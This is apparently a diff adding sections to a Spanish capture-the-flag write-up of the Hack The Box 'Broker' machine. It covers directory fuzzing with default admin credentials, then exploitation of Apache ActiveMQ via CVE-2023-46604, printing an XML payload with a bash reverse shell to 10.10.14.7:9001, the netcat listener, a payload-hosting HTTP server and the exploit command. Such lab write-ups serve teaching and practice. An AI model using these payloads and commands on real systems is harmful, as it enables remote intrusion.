@@ -108,3 +108,159 @@ Desde aquí se pueden ver opciones para:
 - **Explotación de versiones vulnerables**
 
 ¡Hora de ver qué versión corre y buscar un exploit!
+
+## 🕵️‍♂️ Descubrimiento de rutas y panel oculto
+
+Una vez dentro, me interesaba saber si había rutas o directorios interesantes detrás del servidor web. Para eso, utilicé `ffuf` con la wordlist `common.txt` de Seclists y el encabezado de autenticación básica en base64.
+
+```bash
+ffuf -u http://10.10.11.243/FUZZ \
+-w /path/to/SecLists/Discovery/Web-Content/common.txt \
+-H "Authorization: Basic YWRtaW46YWRtaW4=" \
+-mc 200,204,301,302,307,403 \
+-fs 401 -t 40
+```
+
+📌 La opción `-fs 401` filtra las respuestas con código 401 (Unauthorized) que ya sabemos que aparecen si no está autenticado correctamente.
+
+![Fuzzing con ffuf](/assets/images/broker/05-ffuf.png)
+
+---
+
+### 🧃 Resultado interesante
+
+Se descubrió la ruta `/admin/`, la cual abrí en el navegador, ¡y bingo! Me llevó al panel de administración real de ActiveMQ:
+
+![Panel admin ActiveMQ](/assets/images/broker/06-activemq-admin.png)
+
+---
+
+## 🧬 Identificación de versión
+
+Desde la interfaz se muestra claramente la versión:
+
+```
+Apache ActiveMQ 5.15.15
+```
+
+🎯 Esta información es clave para buscar exploits públicos o vulnerabilidades conocidas.
+
+---
+
+### 🧠 Próximo paso:
+
+Voy a buscar posibles exploits para esa versión. Algunos caminos que valen la pena:
+
+- Revisar CVEs relacionados con ActiveMQ 5.15.15.
+- Ver si permite subida de archivos, ejecución de comandos o lectura de rutas internas.
+- Probar exploits disponibles en `searchsploit` o `exploit-db`.
+
+## 💥 Explotación – CVE-2023-46604 (Apache ActiveMQ RCE)
+
+Después de identificar que el servidor corría **Apache ActiveMQ 5.15.15**, busqué vulnerabilidades asociadas y encontré una muy reciente:
+
+> 📌 [CVE-2023-46604 en GitHub](https://github.com/evkl1d/CVE-2023-46604)
+
+Esta vulnerabilidad permite **ejecución remota de comandos** (RCE) mediante deserialización insegura en el protocolo OpenWire.
+
+![Repositorio del exploit](/assets/images/broker/07-exploit-repo.png)
+
+---
+
+### 🔧 Preparación del entorno
+
+El repositorio incluye dos archivos clave:
+
+- `exploit.py`: script en Python que envía la carga maliciosa.
+- `poc.xml`: XML especialmente diseñado con payload para ejecutar comandos.
+
+Este es un fragmento del archivo `poc.xml`:
+
+```xml
+<constructor-arg>
+  <list>
+    <value>bash</value>
+    <value>-c</value>
+    <value>bash -i &gt;&amp; /dev/tcp/10.10.14.7/9001 0&gt;&amp;1</value>
+  </list>
+</constructor-arg>
+```
+
+Este payload busca una **reverse shell** a nuestro equipo atacante (`10.10.14.7`, puerto `9001`).
+
+![Contenido del XML](/assets/images/broker/08-xml-payload.png)
+
+---
+
+### 🔊 Preparando escucha y servidor
+
+1. Primero levanté una escucha con `netcat` en el puerto 9001:
+
+```bash
+nc -lvp 9001
+```
+
+![Netcat escuchando](/assets/images/broker/09-nc-listen.png)
+
+2. Luego, serví el archivo `poc.xml` por HTTP desde el mismo directorio del exploit:
+
+```bash
+sudo python3 -m http.server 80
+```
+
+Esto permite que el `exploit.py` descargue el payload desde mi máquina atacante.
+
+![Servidor HTTP con python](/assets/images/broker/10-http-server.png)
+
+---
+
+### 🚀 Listo para explotar
+
+Con todo listo, ejecuté el script `exploit.py` y… si todo va bien, debería obtener shell inversa 😈
+
+
+## 🐚 Reverse Shell y flag de usuario
+
+Con el listener listo y el servidor HTTP sirviendo el payload, ejecuté el exploit:
+
+```bash
+python3 exploit.py -i 10.10.11.243 -p 61616 -u http://10.10.14.7/poc.xml
+```
+
+![Ejecución del exploit](/assets/images/broker/11-exploit-run.png)
+
+---
+
+### ✅ ¡Conexión recibida!
+
+Al instante, mi listener en el puerto `9001` recibió conexión desde la máquina víctima. Tenía shell interactiva como el usuario `activemq`:
+
+```bash
+nc -lvp 9001
+```
+
+```bash
+Connection received on broker.htb 51634
+activemq@broker:/opt/apache-activemq-5.15.15/bin$
+```
+
+![Shell recibida](/assets/images/broker/12-shell-received.png)
+
+---
+
+## 🏁 Flag de usuario
+
+Buscando en el home del usuario, encontré la flag:
+
+```bash
+cat user.txt
+```
+
+![Flag de usuario](/assets/images/broker/13-user-flag.png)
+
+✅ ¡Primera flag conseguida!  
+Ahora tocaría explorar el sistema, buscar vectores para escalar privilegios y ver si podemos llegar a `root`.
+
+> *(Próxima sección: Escalada de privilegios — stay tuned 😈)*
+
+
